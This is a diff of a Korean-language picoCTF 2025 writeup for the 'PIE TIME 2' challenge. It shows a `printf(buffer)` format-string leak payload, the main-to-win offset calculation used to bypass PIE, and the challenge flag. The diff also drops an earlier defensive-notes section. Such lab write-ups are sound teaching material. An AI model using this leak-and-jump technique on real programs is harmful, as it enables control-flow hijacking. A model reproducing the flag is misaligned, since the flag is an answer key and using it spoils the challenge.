@@ -1,42 +1,36 @@
 ---
 title: PIE TIME 2 — picoCTF 2025 pwn writeup
-created: 2026-06-15
-updated: 2026-06-15
+created: 2026-06-23
+updated: 2026-06-23
 type: query
-tags: [ctf, pwn, format-string, pie, aslr, stack-leak, picoctf]
-sources: [https://systemweakness.com/pie-time-2-picoctf-2025-ca481b91d209, https://hackmd.io/@sal/HJtUdR5n1e, https://medium.com/@anandrishav2228/picoctf-pie-time-2-walkthrough-af7d513c8484]
+tags: [ctf, picoctf, pwn, binary-exploitation, format-string, pie-bypass]
+sources: [https://github.com/PS-003R32/picoCTF/blob/main/picoCTF-2025/Binary-Exploitation/PIE%20TIME2.md]
 confidence: high
 ---
 
 # PIE TIME 2 — picoCTF 2025 pwn writeup
 
-> `PIE TIME 2`는 **`printf(buffer)` 형식 문자열 취약점을 이용해 코드/스택 주소를 누출한 뒤, PIE 베이스를 계산해서 `win()`으로 점프하는 picoCTF 2025 pwn 문제**입니다. 핵심은 **format string leak + PIE offset 계산**입니다.
+> PIE TIME의 발전형으로, 이번에는 `main` 주소를 직접 제공하지 않고 **format string 취약점**을 이용해 직접 leak해야 합니다. `printf(buffer)` FSB로 main 주소를 읽은 뒤, offset 계산으로 `win()`으로 jump합니다.
 
-## 1. 핵심 요약
+## 참고 URL
+- [PS-003R32/picoCTF — PIE TIME2](https://github.com/PS-003R32/picoCTF/blob/main/picoCTF-2025/Binary-Exploitation/PIE%20TIME2.md)
 
-- PIE TIME과 달리 `main()` 주소를 직접 보여주지 않습니다.
-- 대신 `printf(buffer)`가 있어 **format string vulnerability**가 존재합니다.
-- `%p` 같은 서식 지정자를 이용해 스택에서 코드 주소를 읽습니다.
-- 누출한 주소와 `win()`의 오프셋을 계산해 최종 점프 주소를 만듭니다.
-
-## 2. 문제 구조
+## 1. 문제 구조
 
 | 항목 | 내용 |
 |------|------|
 | 플랫폼 | picoCTF 2025 |
-| 분류 | pwn / format string / PIE-ASLR |
-| 핵심 요소 | `printf(buffer)`, address leak, PIE base computation |
-| 목표 | `win()`으로 제어 흐름 이동 |
-| 난이도 | 중급 |
+| 분류 | pwn / binary exploitation |
+| 핵심 요소 | Format string leak, PIE bypass, function pointer hijack |
+| 난이도 | Easy (200pts) |
 
-## 3. 취약점 위치
-
+### Source (vuln.c)
 ```c
 void call_functions() {
   char buffer[64];
   printf("Enter your name:");
   fgets(buffer, 64, stdin);
-  printf(buffer);  // format string vulnerability
+  printf(buffer);    // ← Format String Vulnerability!
 
   unsigned long val;
   printf(" enter the address to jump to, ex => 0x12345: ");
@@ -45,59 +39,48 @@ void call_functions() {
   void (*foo)(void) = (void (*)())val;
   foo();
 }
+
+int win() { /* reads and prints flag.txt */ }
 ```
 
-## 4. 공격 흐름
+## 2. 공격 흐름
 
-1. 입력란에 `%p` 계열 payload를 넣어 스택 값을 누출합니다.
-2. 누출된 주소가 `main()` 또는 그 근처임을 확인합니다.
-3. 로컬/정적 분석으로 구한 `main()`↔`win()` 오프셋을 적용합니다.
-4. 계산된 `win()` 주소를 다음 프롬프트에 넣습니다.
-5. 프로그램이 `win()`을 호출하면서 플래그를 출력합니다.
-
-## 5. 대표 누출 패턴
+### Step 1: Format string으로 main leak
+`%p`를 여러 개 입력해 스택에서 main 함수 주소를 찾습니다.
 
 ```text
-%19$p
-%23$p
+Enter your name: %p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p
 ```
 
-- 실제 위치는 빌드마다 다를 수 있습니다.
-- 한 번 주소를 찾으면 PIE 베이스를 역산할 수 있습니다.
+출력된 주소 중 main 함수 영역(실행 주소)을 식별합니다.
 
-## 재현 절차
-1. `printf(buffer)`로 leak이 가능한지 확인합니다.
-2. `%p` 계열로 코드/스택 주소를 누출합니다.
-3. 누출된 주소와 `win()` 오프셋을 더해 최종 입력값을 계산합니다.
+### Step 2: Offset 계산
+`gdb`로 main과 win의 차이를 계산합니다.
 
-```bash
-# format string leak을 관찰합니다.
-printf '%%p %%p %%p
-' | ./pie-time-2
-
-# 실행 중 출력과 PIE 오프셋을 함께 확인합니다.
-gdb -q ./pie-time-2
+```text
+main = 0x0000555555555441
+win  = 0x000055555555536a
+offset = main - win = 0xD7
 ```
 
-## 6. 왜 가능한가
+### Step 3: Leak → Jump
+FSB로 얻은 main 주소에서 `0xD7`을 빼서 `win()` 주소를 계산합니다.
 
-PIE는 코드의 **절대 주소**만 바꾸고, 함수 간 **상대 오프셋**은 유지합니다. 따라서 코드 주소 하나만 새면, 나머지 함수 주소를 계산할 수 있습니다.
+```text
+enter the address to jump to: 0x55555555536a   ← leaked_main - 0xD7
+You won!
+picoCTF{p13_5h0u1dn'7_134k_2718fe04}
+```
 
-## 7. 방어 관점 메모
+## Flag
+`picoCTF{p13_5h0u1dn'7_134k_2718fe04}`
 
-- `printf(user_input)`을 쓰지 않습니다.
-- 형식 문자열은 반드시 고정 문자열로 사용합니다.
-- PIE만으로는 충분하지 않으며, 입력 검증이 필수입니다.
+## 3. 핵심 패턴
+1. PIE TIME과 달리 **직접 주소를 leak해야 하는 점**이 차이점
+2. Format string으로 스택에서 main 함수 주소 위치를 찾는 것이 핵심
+3. offset 개념은 PIE TIME과 동일 (`win = main - offset`)
 
-## 8. `PIE TIME`과의 차이
-
-- `PIE TIME`: `main()` 주소를 직접 보여줌
-- `PIE TIME 2`: 직접 누출이 없고, **format string으로 주소를 먼저 새야 함**
-
-## 9. 참고 자료
-
-- [PIE TIME 2 — System Weakness](https://systemweakness.com/pie-time-2-picoctf-2025-ca481b91d209)
-- [PicoCTF 2025 - Binary Exploitation Challenges Writeup - HackMD](https://hackmd.io/@sal/HJtUdR5n1e)
-- [PicoCTF: PIE TIME 2 Walkthrough - Medium](https://medium.com/@anandrishav2228/picoctf-pie-time-2-walkthrough-af7d513c8484)
-- [[format-string-ctf-patterns]]
+## 4. 연결 개념
 - [[pie-aslr-function-offset-ctf-patterns]]
+- [[format-string-ctf-patterns]]
+- [[exploitation]]
